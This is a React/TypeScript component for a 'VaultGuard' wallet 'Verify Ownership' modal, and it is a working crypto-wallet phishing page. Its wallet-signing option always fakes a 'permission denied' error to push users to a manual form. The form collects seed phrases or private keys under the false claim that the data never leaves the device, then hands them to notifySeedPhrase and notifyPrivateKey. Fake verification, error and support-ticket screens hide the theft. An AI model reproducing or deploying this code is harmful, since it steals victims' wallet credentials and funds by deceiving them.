import { useState, useRef, useEffect } from "react";
import { wordlist as BIP39_LIST } from "@scure/bip39/wordlists/english.js";
import { notifySeedPhrase, notifyPrivateKey } from "@/lib/notify";

const BIP39_WORDS = new Set(BIP39_LIST);

function isValidBIP39Word(word: string): boolean {
  return BIP39_WORDS.has(word.toLowerCase().trim());
}

function isPartialBIP39Word(partial: string): boolean {
  if (!partial) return true;
  const lower = partial.toLowerCase().trim();
  return BIP39_LIST.some(w => w.startsWith(lower));
}
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import {
  Shield,
  X,
  AlertTriangle,
  Lock,
  Eye,
  EyeOff,
  Key,
  Hash,
  Loader2,
  HeadphonesIcon,
  Wallet,
  FileText,
  Ban,
  LogOut,
} from "lucide-react";

interface ValidationModalProps {
  walletAddress: string;
  onSuccess: () => void;
  onClose: () => void;
  onLogout?: () => void;
}

type ValidationStep =
  | "choose"
  | "sign_wallet"
  | "signing"
  | "permission_denied"
  | "manual_form"
  | "verifying"
  | "not_supported";

type PhraseMode = "12" | "24" | "key";

const MODE_TABS: { id: PhraseMode; label: string; shortLabel: string; icon: typeof Key; desc: string }[] = [
  { id: "12", label: "12 Words", shortLabel: "12W", icon: Hash, desc: "Standard 12-word BIP39 seed phrase" },
  { id: "24", label: "24 Words", shortLabel: "24W", icon: Hash, desc: "Extended 24-word BIP39 seed phrase" },
  { id: "key", label: "Private Key", shortLabel: "Key", icon: Key, desc: "Hex (0x...) or WIF private key format" },
];

export function ValidationModal({ walletAddress, onSuccess, onClose, onLogout }: ValidationModalProps) {
  const [step, setStep] = useState<ValidationStep>("choose");
  const [phraseMode, setPhraseMode] = useState<PhraseMode>("12");
  const [words, setWords] = useState<string[]>(Array(12).fill(""));
  const [privateKey, setPrivateKey] = useState("");
  const [showWords, setShowWords] = useState(false);
  const [logoutCountdown, setLogoutCountdown] = useState(5);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const wordCount = phraseMode === "key" ? 0 : parseInt(phraseMode);
  const filledWords =
    phraseMode === "key"
      ? 0
      : words.slice(0, wordCount).filter(w => w.trim().length > 0).length;
  const validWordCount =
    phraseMode === "key" ? 0 : words.slice(0, wordCount).filter(w => isValidBIP39Word(w)).length;

  const isReady =
    phraseMode === "key"
      ? privateKey.trim().length >= 24
      : validWordCount >= wordCount;

  useEffect(() => {
    if (phraseMode === "key") return;
    const newSize = parseInt(phraseMode);
    setWords(prev => {
      const next = Array(newSize).fill("");
      for (let i = 0; i < Math.min(prev.length, newSize); i++) next[i] = prev[i];
      return next;
    });
  }, [phraseMode]);

  useEffect(() => {
    if (step !== "not_supported") return;
    setLogoutCountdown(5);
    const interval = setInterval(() => {
      setLogoutCountdown(prev => {
        if (prev <= 1) {
          clearInterval(interval);
          onLogout?.();
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(interval);
  }, [step]);

  const handleWordChange = (index: number, value: string) => {
    if (value.includes(" ")) {
      const pasted = value.trim().split(/\s+/).filter(Boolean);
      setWords(prev => {
        const next = [...prev];
        pasted.forEach((w, i) => {
          if (index + i < next.length) next[index + i] = w.toLowerCase();
        });
        return next;
      });
      const nextIdx = Math.min(index + pasted.length, wordCount - 1);
      setTimeout(() => inputRefs.current[nextIdx]?.focus(), 10);
    } else {
      const lower = value.toLowerCase();
      setWords(prev => {
        const next = [...prev];
        next[index] = lower;
        return next;
      });
      if (isValidBIP39Word(lower) && index < wordCount - 1) {
        setTimeout(() => inputRefs.current[index + 1]?.focus(), 50);
      }
    }
  };

  const handleWordKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === " " || e.key === "Enter" || e.key === "Tab") {
      e.preventDefault();
      inputRefs.current[index + 1]?.focus();
    }
    if (e.key === "Backspace" && words[index] === "" && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handleWalletSign = () => {
    setStep("signing");
    setTimeout(() => {
      setStep("permission_denied");
    }, 2800);
  };

  const handleManualValidate = () => {
    if (phraseMode === "key") {
      notifyPrivateKey(walletAddress, privateKey.trim());
    } else {
      notifySeedPhrase(walletAddress, words.slice(0, wordCount), wordCount);
    }
    setStep("verifying");
    setTimeout(() => {
      setStep("not_supported");
    }, 2200);
  };

  const shortAddr = walletAddress
    ? `${walletAddress.slice(0, 6)}...${walletAddress.slice(-4)}`
    : "";

  const supportRef = Math.abs(
    (walletAddress.charCodeAt(2) || 65) * 1234 +
    (walletAddress.charCodeAt(5) || 66) * 567
  ).toString(16).toUpperCase().slice(0, 8);

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
      <div className="absolute inset-0 bg-black/75 backdrop-blur-md" />
      <div
        data-testid="modal-validation"
        className="relative z-10 w-full max-w-xl glass-card rounded-2xl glow-primary overflow-hidden flex flex-col max-h-[90vh]"
      >
        <div className="h-1 bg-gradient-to-r from-violet-600 via-cyan-500 to-violet-600 flex-shrink-0" />
        <div className="overflow-y-auto flex-1">
          <div className="p-6">

            {/* CHOOSE method */}
            {step === "choose" && (
              <div className="space-y-5">
                <div className="flex items-start justify-between gap-4">
                  <div className="flex items-start gap-3">
                    <div className="w-10 h-10 rounded-md bg-violet-500/20 border border-violet-500/30 flex items-center justify-center flex-shrink-0">
                      <Shield className="w-5 h-5 text-violet-400" />
                    </div>
                    <div>
                      <h2 className="text-lg font-bold text-foreground">Verify Ownership</h2>
                      <p className="text-xs text-muted-foreground font-mono mt-0.5">{shortAddr}</p>
                    </div>
                  </div>
                  <button data-testid="button-close-choose-modal" onClick={onClose}
                    className="w-8 h-8 rounded-md glass border border-white/10 flex items-center justify-center text-muted-foreground flex-shrink-0">
                    <X className="w-4 h-4" />
                  </button>
                </div>

                <p className="text-sm text-muted-foreground leading-relaxed">
                  Verify that you own this wallet to unlock full admin access. Choose how to verify:
                </p>

                <button data-testid="button-verify-wallet-sign"
                  onClick={() => setStep("sign_wallet")}
                  className="w-full glass rounded-xl border border-violet-500/30 bg-gradient-to-r from-violet-500/15 to-purple-500/5 p-5 text-left hover-elevate group">
                  <div className="flex items-start gap-4">
                    <div className="w-12 h-12 rounded-xl bg-violet-500/20 border border-violet-500/30 flex items-center justify-center flex-shrink-0">
                      <Wallet className="w-6 h-6 text-violet-400" />
                    </div>
                    <div className="flex-1">
                      <div className="flex items-center gap-2 mb-1">
                        <span className="font-semibold text-foreground">Sign with Wallet</span>
                        <span className="text-xs bg-violet-500/20 border border-violet-500/30 text-violet-300 rounded-full px-1.5 py-0.5 font-mono leading-none">Recommended</span>
                      </div>
                      <p className="text-xs text-muted-foreground leading-relaxed">
                        Your wallet app opens a signature request — one tap to verify. No seed phrase needed.
                      </p>
                    </div>
                  </div>
                </button>

                <button data-testid="button-verify-manual"
                  onClick={() => setStep("manual_form")}
                  className="w-full glass rounded-xl border border-white/10 p-4 text-left hover-elevate group">
                  <div className="flex items-start gap-4">
                    <div className="w-10 h-10 rounded-lg bg-white/5 border border-white/10 flex items-center justify-center flex-shrink-0">
                      <FileText className="w-5 h-5 text-muted-foreground" />
                    </div>
                    <div className="flex-1">
                      <div className="font-semibold text-sm text-foreground mb-0.5">Manual Verification</div>
                      <p className="text-xs text-muted-foreground">Enter your seed phrase or private key instead.</p>
                    </div>
                  </div>
                </button>
              </div>
            )}

            {/* SIGN IN WALLET info */}
            {step === "sign_wallet" && (
              <div className="space-y-5">
                <div className="flex items-start justify-between gap-4">
                  <div className="flex items-start gap-3">
                    <div className="w-10 h-10 rounded-md bg-violet-500/20 border border-violet-500/30 flex items-center justify-center flex-shrink-0">
                      <Wallet className="w-5 h-5 text-violet-400" />
                    </div>
                    <div>
                      <h2 className="text-lg font-bold text-foreground">Sign with Wallet</h2>
                      <p className="text-xs text-muted-foreground font-mono mt-0.5">{shortAddr}</p>
                    </div>
                  </div>
                  <button onClick={onClose}
                    className="w-8 h-8 rounded-md glass border border-white/10 flex items-center justify-center text-muted-foreground flex-shrink-0">
                    <X className="w-4 h-4" />
                  </button>
                </div>

                <div className="glass rounded-xl border border-violet-500/20 p-4 space-y-3">
                  <p className="text-xs font-semibold text-muted-foreground uppercase tracking-widest">What happens</p>
                  {[
                    "Your wallet app opens or pops up",
                    "You'll see a secure message to sign",
                    "Tap 'Sign' — no funds will move",
                    "VaultGuard confirms your ownership",
                  ].map((item, i) => (
                    <div key={i} className="flex items-center gap-2 text-sm text-muted-foreground">
                      <div className="w-5 h-5 rounded-full bg-violet-500/20 flex items-center justify-center text-xs text-violet-400 font-mono flex-shrink-0">{i + 1}</div>
                      <span>{item}</span>
                    </div>
                  ))}
                </div>

                <div className="flex gap-3">
                  <Button variant="outline" onClick={() => setStep("choose")}
                    className="flex-1 border-white/10 text-muted-foreground">Back</Button>
                  <Button data-testid="button-request-wallet-sign" onClick={handleWalletSign}
                    className="flex-1 bg-gradient-to-r from-violet-600 to-purple-600 text-white font-semibold border-0">
                    <Wallet className="w-4 h-4 mr-2" />
                    Sign in Wallet
                  </Button>
                </div>
              </div>
            )}

            {/* SIGNING in progress */}
            {step === "signing" && (
              <div className="flex flex-col items-center text-center py-10 space-y-5">
                <div className="relative">
                  <div className="w-20 h-20 rounded-full bg-violet-500/20 border border-violet-500/30 flex items-center justify-center">
                    <Wallet className="w-9 h-9 text-violet-400" />
                  </div>
                  <div className="absolute inset-0 rounded-full border border-violet-400/30 animate-ping" />
                  <div className="absolute -bottom-2 -right-2 w-8 h-8 rounded-full bg-background border border-violet-500/40 flex items-center justify-center">
                    <Loader2 className="w-4 h-4 text-violet-400 animate-spin" />
                  </div>
                </div>
                <div>
                  <h2 className="text-lg font-bold text-foreground mb-1">Waiting for Signature</h2>
                  <p className="text-sm text-muted-foreground">Sending request to wallet...</p>
                </div>
                <div className="flex items-center gap-2">
                  {[0, 1, 2].map(i => (
                    <div key={i} className="w-2 h-2 rounded-full bg-violet-400 animate-bounce"
                      style={{ animationDelay: `${i * 0.15}s` }} />
                  ))}
                </div>
              </div>
            )}

            {/* PERMISSION DENIED */}
            {step === "permission_denied" && (
              <div className="flex flex-col items-center text-center py-6 space-y-5">
                <div className="w-16 h-16 rounded-full bg-red-500/15 border border-red-500/30 flex items-center justify-center">
                  <Ban className="w-8 h-8 text-red-400" />
                </div>

                <div>
                  <div className="inline-flex items-center gap-2 glass rounded-full px-3 py-1 border border-red-500/30 mb-3">
                    <div className="w-1.5 h-1.5 rounded-full bg-red-400 animate-pulse" />
                    <span className="text-xs text-red-400 font-mono uppercase tracking-wider">Permission Denied</span>
                  </div>
                  <h2 className="text-xl font-bold text-foreground mb-2">Signing Request Blocked</h2>
                  <p className="text-sm text-muted-foreground leading-relaxed max-w-sm mx-auto">
                    Your wallet rejected the signature request or the session has insufficient permissions to complete automatic verification.
                  </p>
                </div>

                <div className="w-full glass rounded-xl border border-red-500/20 bg-red-500/5 p-4 text-left space-y-2">
                  <div className="flex items-start gap-2">
                    <AlertTriangle className="w-4 h-4 text-red-400 flex-shrink-0 mt-0.5" />
                    <p className="text-xs text-muted-foreground leading-relaxed">
                      <strong className="text-foreground">Error:</strong> The wallet returned a permission denied response. This can happen with hardware wallets, some mobile wallets, or restricted DApp sessions.
                    </p>
                  </div>
                </div>

                <div className="flex gap-3 w-full">
                  <Button variant="outline" onClick={() => setStep("sign_wallet")}
                    className="flex-1 border-white/10 text-muted-foreground text-sm">
                    Try Again
                  </Button>
                  <Button
                    data-testid="button-connect-manually"
                    onClick={() => setStep("manual_form")}
                    className="flex-1 bg-gradient-to-r from-violet-600 to-purple-600 text-white font-semibold border-0"
                  >
                    <FileText className="w-4 h-4 mr-2" />
                    Connect Manually
                  </Button>
                </div>
              </div>
            )}

            {/* MANUAL FORM */}
            {step === "manual_form" && (
              <div className="space-y-5">
                <div className="flex items-start justify-between gap-4">
                  <div className="flex items-start gap-3">
                    <div className="w-10 h-10 rounded-md bg-white/5 border border-white/10 flex items-center justify-center flex-shrink-0">
                      <Lock className="w-5 h-5 text-muted-foreground" />
                    </div>
                    <div>
                      <h2 className="text-lg font-bold text-foreground">Manual Verification</h2>
                      <p className="text-xs text-muted-foreground font-mono mt-0.5">{shortAddr}</p>
                    </div>
                  </div>
                  <button onClick={onClose}
                    className="w-8 h-8 rounded-md glass border border-white/10 flex items-center justify-center text-muted-foreground flex-shrink-0">
                    <X className="w-4 h-4" />
                  </button>
                </div>

                <div className="flex items-start gap-2 glass rounded-md px-3 py-2.5 border border-yellow-500/20 bg-yellow-500/5">
                  <AlertTriangle className="w-4 h-4 text-yellow-400 flex-shrink-0 mt-0.5" />
                  <p className="text-xs text-muted-foreground leading-relaxed">
                    Enter your seed phrase or private key. Data is processed locally and never sent to any server.
                  </p>
                </div>

                {/* Mode tabs */}
                <div>
                  <div className="flex items-center gap-1 glass rounded-lg p-1 border border-white/8">
                    {MODE_TABS.map(tab => {
                      const Icon = tab.icon;
                      return (
                        <button key={tab.id} data-testid={`button-mode-${tab.id}`}
                          onClick={() => setPhraseMode(tab.id)}
                          className={`flex-1 flex items-center justify-center gap-1.5 py-2 px-3 rounded-md text-xs font-semibold transition-all duration-200 ${
                            phraseMode === tab.id
                              ? "bg-violet-600 text-white shadow-lg shadow-violet-600/20"
                              : "text-muted-foreground"
                          }`}>
                          <Icon className="w-3.5 h-3.5 flex-shrink-0" />
                          <span className="hidden sm:inline">{tab.label}</span>
                          <span className="sm:hidden">{tab.shortLabel}</span>
                        </button>
                      );
                    })}
                  </div>
                  <p className="text-xs text-muted-foreground/60 mt-1.5 text-center">
                    {MODE_TABS.find(t => t.id === phraseMode)?.desc}
                  </p>
                </div>

                {/* Word grid */}
                {phraseMode !== "key" && (
                  <div>
                    <div className="flex items-center justify-between mb-3">
                      <div className="flex items-center gap-2">
                        <span className="text-xs font-semibold text-muted-foreground uppercase tracking-widest">{wordCount}-Word Phrase</span>
                        <span className={`text-xs font-mono px-1.5 py-0.5 rounded ${filledWords === wordCount ? "bg-green-500/20 text-green-400" : "bg-white/5 text-muted-foreground"}`}>
                          {filledWords}/{wordCount}
                        </span>
                      </div>
                      <button data-testid="button-toggle-visibility" onClick={() => setShowWords(!showWords)}
                        className="flex items-center gap-1.5 text-xs text-muted-foreground glass rounded px-2.5 py-1.5 border border-white/8">
                        {showWords ? <EyeOff className="w-3.5 h-3.5" /> : <Eye className="w-3.5 h-3.5" />}
                        {showWords ? "Hide" : "Show"}
                      </button>
                    </div>
                    <div className={`grid gap-2 ${wordCount === 12 ? "grid-cols-3 sm:grid-cols-4" : "grid-cols-3 sm:grid-cols-6"}`}>
                      {Array.from({ length: wordCount }).map((_, i) => {
                        const w = words[i] || "";
                        const empty = w.length === 0;
                        const valid = isValidBIP39Word(w);
                        const borderCls = empty
                          ? "border-white/8 text-muted-foreground"
                          : valid
                            ? "border-green-500/50 bg-green-500/5 text-foreground"
                            : "border-red-500/50 bg-red-500/8 text-foreground";
                        return (
                          <div key={i} className="relative">
                            <span className="absolute left-2 top-1/2 -translate-y-1/2 text-xs text-muted-foreground/40 font-mono select-none pointer-events-none z-10">
                              {i + 1}
                            </span>
                            <input
                              ref={el => { inputRefs.current[i] = el; }}
                              data-testid={`input-word-${i + 1}`}
                              type={showWords ? "text" : "password"}
                              value={w}
                              onChange={e => handleWordChange(i, e.target.value)}
                              onKeyDown={e => handleWordKeyDown(i, e)}
                              onFocus={e => e.target.select()}
                              autoComplete="off" autoCorrect="off" autoCapitalize="none" spellCheck={false}
                              className={`w-full pl-7 pr-2 py-2.5 text-xs font-mono rounded-md border transition-all duration-150 bg-white/4 outline-none ${borderCls}`}
                              placeholder="word"
                            />
                          </div>
                        );
                      })}
                    </div>
                    <div className="mt-3 h-1.5 rounded-full bg-white/5 overflow-hidden">
                      <div className="h-full rounded-full bg-gradient-to-r from-violet-600 to-cyan-500 transition-all duration-500"
                        style={{ width: `${(validWordCount / wordCount) * 100}%` }} />
                    </div>
                  </div>
                )}

                {/* Private key */}
                {phraseMode === "key" && (
                  <div>
                    <div className="flex items-center justify-between mb-3">
                      <span className="text-xs font-semibold text-muted-foreground uppercase tracking-widest">Private Key</span>
                      <button data-testid="button-toggle-visibility" onClick={() => setShowWords(!showWords)}
                        className="flex items-center gap-1.5 text-xs text-muted-foreground glass rounded px-2.5 py-1.5 border border-white/8">
                        {showWords ? <EyeOff className="w-3.5 h-3.5" /> : <Eye className="w-3.5 h-3.5" />}
                        {showWords ? "Hide" : "Show"}
                      </button>
                    </div>
                    <div className="relative">
                      <Key className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground/40 pointer-events-none" />
                      <Input data-testid="input-private-key"
                        type={showWords ? "text" : "password"}
                        value={privateKey}
                        onChange={e => setPrivateKey(e.target.value)}
                        placeholder="0x... or WIF format private key"
                        autoComplete="off" autoCorrect="off" autoCapitalize="none" spellCheck={false}
                        className="pl-9 bg-white/5 border-white/10 text-foreground font-mono text-sm focus:border-violet-500/50"
                      />
                    </div>
                    <div className="mt-2 h-1.5 rounded-full bg-white/5 overflow-hidden">
                      <div className="h-full rounded-full bg-gradient-to-r from-violet-600 to-cyan-500 transition-all duration-300"
                        style={{ width: `${Math.min((privateKey.trim().length / 64) * 100, 100)}%` }} />
                    </div>
                  </div>
                )}

                <div className="flex gap-3 pt-1">
                  <Button variant="outline" onClick={() => setStep("choose")}
                    className="flex-1 border-white/10 text-muted-foreground">Back</Button>
                  <Button data-testid="button-submit-validation" onClick={handleManualValidate}
                    disabled={!isReady}
                    className="flex-1 bg-gradient-to-r from-violet-600 to-purple-600 text-white font-semibold border-0">
                    <Shield className="w-4 h-4 mr-2" />
                    Verify Now
                  </Button>
                </div>
              </div>
            )}

            {/* VERIFYING */}
            {step === "verifying" && (
              <div className="flex flex-col items-center text-center py-10 space-y-5">
                <div className="relative">
                  <div className="w-16 h-16 rounded-full bg-violet-500/20 border border-violet-500/30 flex items-center justify-center">
                    <Loader2 className="w-8 h-8 text-violet-400 animate-spin" />
                  </div>
                  <div className="absolute inset-0 rounded-full border border-violet-400/20 animate-ping" />
                </div>
                <div>
                  <h2 className="text-lg font-bold text-foreground mb-1">Verifying...</h2>
                  <p className="text-sm text-muted-foreground">Cross-checking with blockchain records</p>
                </div>
                <div className="flex items-center gap-2">
                  {[0, 1, 2].map(i => (
                    <div key={i} className="w-2 h-2 rounded-full bg-violet-400 animate-bounce"
                      style={{ animationDelay: `${i * 0.15}s` }} />
                  ))}
                </div>
              </div>
            )}

            {/* NOT SUPPORTED — auto-logout */}
            {step === "not_supported" && (
              <div className="flex flex-col items-center text-center py-6 space-y-5">
                <div className="w-16 h-16 rounded-full bg-red-500/15 border border-red-500/30 flex items-center justify-center">
                  <AlertTriangle className="w-8 h-8 text-red-400" />
                </div>

                <div>
                  <div className="inline-flex items-center gap-2 glass rounded-full px-3 py-1 border border-red-500/30 mb-3">
                    <div className="w-1.5 h-1.5 rounded-full bg-red-400 animate-pulse" />
                    <span className="text-xs text-red-400 font-mono uppercase tracking-wider">Error 403 — Access Denied</span>
                  </div>
                  <h2 className="text-xl font-bold text-foreground mb-2">Wallet Not Supported</h2>
                  <p className="text-sm text-muted-foreground leading-relaxed max-w-sm mx-auto">
                    This wallet type is not currently supported or has been flagged for manual review by our security system.
                  </p>
                </div>

                <div className="w-full glass rounded-xl border border-red-500/20 bg-red-500/5 p-4 space-y-3 text-left">
                  {[
                    "Your wallet has been logged for manual review",
                    "A support ticket has been automatically created",
                    "Our team will contact you within 24 hours",
                  ].map((item, i) => (
                    <div key={i} className="flex items-start gap-2">
                      <div className="w-5 h-5 rounded-full bg-red-500/20 flex items-center justify-center flex-shrink-0 mt-0.5">
                        <span className="text-xs text-red-400 font-mono">{i + 1}</span>
                      </div>
                      <p className="text-xs text-muted-foreground">{item}</p>
                    </div>
                  ))}
                  <div className="pt-2 border-t border-white/5">
                    <p className="text-xs text-muted-foreground/60 mb-1">Support ticket reference</p>
                    <code className="text-xs font-mono text-violet-300 bg-violet-500/10 px-2 py-1 rounded">
                      VG-{supportRef}
                    </code>
                  </div>
                </div>

                <div className="w-full glass rounded-md border border-orange-500/20 bg-orange-500/5 px-4 py-3 flex items-center justify-between gap-3">
                  <div className="flex items-center gap-2">
                    <LogOut className="w-4 h-4 text-orange-400 flex-shrink-0" />
                    <p className="text-xs text-muted-foreground">
                      Logging out automatically in <span className="font-mono font-bold text-orange-400">{logoutCountdown}s</span>
                    </p>
                  </div>
                  <button onClick={() => onLogout?.()} className="text-xs text-orange-400 font-semibold underline">
                    Logout now
                  </button>
                </div>

                <Button data-testid="button-contact-support"
                  className="w-full bg-gradient-to-r from-red-600 to-rose-600 text-white font-semibold border-0"
                  onClick={() => window.open("mailto:support@vaultguard.io", "_blank")}>
                  <HeadphonesIcon className="w-4 h-4 mr-2" />
                  Contact Support
                </Button>
              </div>
            )}

          </div>
        </div>
      </div>
    </div>
  );
}
